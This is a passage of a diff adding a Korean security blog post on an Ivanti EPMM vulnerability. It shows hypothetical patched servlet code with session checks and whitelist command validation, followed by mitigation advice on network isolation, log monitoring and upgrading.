</span><span class="err">명령어를</span><span class="w"> </span><span class="err">실행하는</span><span class="w"> </span><span class="err">부분에서</span><span class="w"> </span><span class="err">화이트리스트</span><span class="w"> </span><span class="err">기반의</span><span class="w"> </span><span class="err">파라미터</span><span class="w"> </span><span class="err">검증</span><span class="w"> </span><span class="err">로직이</span><span class="w"> </span><span class="err">추가되었습니다</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">````</span><span class="n">java</span><span class="o">`</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">//</span><span class="w"> </span><span class="err">패치된</span><span class="w"> </span><span class="err">코드</span><span class="w"> </span><span class="err">예시</span><span class="w"> </span><span class="p">(</span><span class="err">가상</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">protected</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="nf">doGet</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">resp</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="mi">1</span><span class="p">.</span><span class="w"> </span><span class="err">최우선</span><span class="w"> </span><span class="err">인증</span><span class="w"> </span><span class="err">및</span><span class="w"> </span><span class="err">권한</span><span class="w"> </span><span class="err">검증</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">AuthManager</span><span class="p">.</span><span class="nf">getInstance</span><span class="p">().</span><span class="nf">checkSession</span><span class="p">(</span><span class="n">req</span><span class="p">))</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">resp</span><span class="p">.</span><span class="nf">sendError</span><span class="p">(</span><span class="mi">403</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="nf">getParameter</span><span class="p">(</span><span class="s2">&#34;cmd&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="w"> </span><span class="err">화이트리스트</span><span class="w"> </span><span class="err">기반</span><span class="w"> </span><span class="err">명령어</span><span class="w"> </span><span class="err">검증</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">CommandValidator</span><span class="p">.</span><span class="nf">isValid</span><span class="p">(</span><span class="n">command</span><span class="p">))</span><span class="w"> </span><span class="err">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">resp</span><span class="p">.</span><span class="nf">sendError</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="err">처리</span><span class="w"> </span><span class="err">로직</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="err">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>우회 가능성 측면에서, 단순한 URL 패턴 매칭만으로 막을 경우 URL 인코딩이나 이중 인코딩을 통한 우회가 시도될 수 있습니다. 따라서 Ivanti는 정규 표현식 기반의 정교한 검증 로직을 적용하였으나, 사용자는 가능한 한 빨리 최신 버전으로 업그레이드해야 합니다.</p>
+<h2 id="완화-조치-mitigation">완화 조치 (Mitigation)
+</h2><p>패치를 즉시 적용하기 어려운 상황에서의 임시 완화 조치가 필수적입니다. 가장 효과적인 임시 조치는 인터넷에서 EPMM 관리 콘솔로의 인바운드 접속을 차단하는 것입니다. EPMM 서버는 VPN 내부나 사설 네트워크에서만 접근 가능하도록 방화벽 규칙(Firewall Rule)을 설정해야 합니다.</p>
+<ul>
+<li><strong>네트워크 격리 (Network Segmentation)</strong>: 관리 포트(TCP 8443, 443)에 대해 신뢰할 수 있는 IP 대역(예: 관리자 VPN IP, 내부 네트워크) 이외의 모든 접속을 차단하십시오.</li>
+<li><strong>로그 모니터링 (Log Monitoring)</strong>: <code>/mics/</code> 경로에 대한 비정상적인 200 OK 응답이나 과도한 API 호출 시도를 탐지하는 SIEM 규칙을 배포하십시오.</li>
+<li><strong>영구적 조치</strong>: Ivanti에서 제공하는 최신 패치(버전 11.14 이상)로 즉시 업그레이드하십시오. 업그레이드 후에는 시스템에서 의심스러운 계정이나 백도어가 생성되었는지 검토하는 포렌식(Forensic) 조사를 병행하는 것이 좋습니다.</li>
+</ul>
+<h2 id="참고자료">참고자료
+</h2><ul>
+<li><a class="link" href="https://www.ivanti.com/blog"  target="_blank" rel="noopener"
+    >Ivanti Security Advisory</a></li>
+<li><a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2026-0885"  target="_blank" rel="noopener"
+    >NVD - CVE-2026-0885</a></li>
+<li><a class="link" href="https://cyberscoop.com/"  target="_blank" rel="noopener"
+    >CyberScoop Article</a></li>
+</ul>
+<hr>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/cve/">CVE</a>
+        
+            <a href="/tags/vulnerability/">Vulnerability</a>
+        
+            <a href="/tags/exploit/">Exploit</a>
+        
+            <a href="/tags/ivanti/">Ivanti</a>
+        
+            <a href="/tags/epmm/">EPMM</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 코딩이 싫은 거북이
+    </section>
+    
+    <section class="powerby">
+        <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>로 만듦 <br />
+        <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>의 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="4.0.0">Stack</a></b> 테마 사용 중
+    </section>
+</footer>
+
+
+    
+
+
+
+<script type="module">
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script>
+    
+
+            </main>
+        </div>
+        <script type="text/javascript" src="/ts/main.387bdf6159ab34d0743ebd228aa9248d1ed2380fa5193ceff9ffdbf345b5309d.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
